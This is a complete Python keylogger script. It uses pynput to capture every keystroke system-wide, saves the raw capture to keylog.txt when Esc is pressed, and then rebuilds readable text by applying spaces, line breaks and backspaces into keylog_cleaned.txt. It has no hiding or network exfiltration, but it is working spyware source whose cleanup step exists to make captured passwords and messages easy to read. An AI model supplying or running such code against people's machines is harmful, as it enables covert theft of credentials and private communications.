from pynput import keyboard
import re

log_file = "keylog.txt"
clean_file = "keylog_cleaned.txt"
raw_log = ""

def on_press(key):
    global raw_log
    try:
        raw_log += key.char
    except AttributeError:
        raw_log += f"[{key}]"

def on_release(key):
    if key == keyboard.Key.esc:
        # Save raw log
        with open(log_file, "w") as f:
            f.write(raw_log)
        print(f"Raw log saved to {log_file}")
        # Run cleanup
        clean_log_file()
        return False

def clean_log_file(input_file="keylog.txt", output_file="keylog_cleaned.txt"):
    with open(input_file, "r") as f:
        raw = f.read()

    cleaned = ""
    i = 0
    while i < len(raw):
        if raw[i] == '[':
            end_idx = raw.find(']', i)
            if end_idx == -1:
                cleaned += raw[i]
                i += 1
                continue
            key_name = raw[i+1:end_idx]
            if key_name == "Key.space":
                cleaned += " "
            elif key_name == "Key.enter":
                cleaned += "\n"
            elif key_name == "Key.backspace":
                cleaned = cleaned[:-1]
            # skip other noisy keys
            i = end_idx + 1
        else:
            cleaned += raw[i]
            i += 1

    # Final cleanup
    cleaned = re.sub(r'\n\s*\n', '\n', cleaned)
    cleaned = re.sub(r' +', ' ', cleaned)
    cleaned = cleaned.strip()

    with open(output_file, "w") as f_out:
        f_out.write(cleaned)
    print(f"Cleaned log saved to {output_file}")

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

